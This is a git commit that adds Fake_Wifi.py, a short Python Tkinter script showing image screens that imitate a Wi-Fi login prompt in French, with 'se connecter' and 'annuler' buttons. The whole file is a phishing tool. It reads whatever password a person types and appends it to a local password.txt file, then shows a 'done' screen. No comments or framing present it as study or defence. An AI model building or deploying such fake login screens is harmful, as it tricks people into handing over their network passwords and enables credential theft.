204977544f1e7c2ddabb678a95d09d63727c3404
Fahadaziztraore <136448250+Fahadaziztraore@users.noreply.github.com>
2024-04-19 15:21:33 +0000

    Add files via upload

---
+++ Fake_Wifi.py
@@ -0,0 +1,31 @@
+
+from tkinter import * 
+
+win = Tk()
+win['bg']="#7D7D7D"
+first = PhotoImage(file="/storage/emulated/0/azert/Fpage.png")
+second= PhotoImage(file="/storage/emulated/0/azert/Spage.png")
+
+done= PhotoImage(file="/storage/emulated/0/azert/done.png")
+
+
+def btn():
+    
+    Spage = Label(image= second,bg="#7D7D7D"). place (x = 0,y= 0)
+    ent = Entry(win, font=("arial",10), width=27)
+    ent.place(x=73,y=400)
+    
+    def save():
+        pwd = ent.get()
+        get_pwd = str(pwd)
+        with open ("password.txt",'a') as save:
+            save.write(get_pwd+"\n")
+            Spage = Label(image= done,bg="#7D7D7D"). place (x = 0,y= 0)
+            
+    conn = Button(win, text ="se connecter",command=save,font=("arial",10),fg="blue",bg="white"). place (x=350,y = 700)
+    
+    conn = Button(win, text ="annuler",font=("arial",10),fg="black",bg="white"). place (x=90,y = 700)
+
+Fpage = Button(image= first, command=btn,bg="#7D7D7D"). place (x=0,y =0)
+
+mainloop ()
